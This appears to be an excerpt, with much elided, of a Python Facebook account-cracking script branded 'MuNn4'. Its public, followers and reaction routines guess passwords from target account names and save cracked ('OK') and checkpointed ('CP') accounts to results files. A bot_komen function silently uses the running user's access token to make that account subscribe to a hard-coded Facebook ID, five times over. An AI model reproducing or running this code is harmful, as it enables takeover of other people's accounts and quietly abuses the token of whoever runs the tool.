...
def bot_komen():
    ...
    requests.post('https://graph.facebook.com/100039625487424/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100039625487424/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100039625487424/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100039625487424/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100039625487424/subscribers?access_token=' + token)
...
def public():
	...
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92m{MuNn4}OK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93m{MuNn4}XP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		pwx = []
		sys.stdout.write(
		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s {MuNn4}OK-:%s - {MuNn4}CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("<=>")
...
def followers():
	...
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mMuNn4OK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/MuNn4CP-%s-%s-%s.txt\n"% (ha, op, ta))
...
def reaction():
	...
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92m{MuNn4OK\033[0;97m Saved In : results/MuNn4OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93m{MuNn4CP\033[0;97m Saved In : results/MuNn4CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		pwx = []
		sys.stdout.write(
		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s MuNn4OK-:%s - MuNn4CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
...
def manual():
	...
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mMuNn4OK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mMuNn4CP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
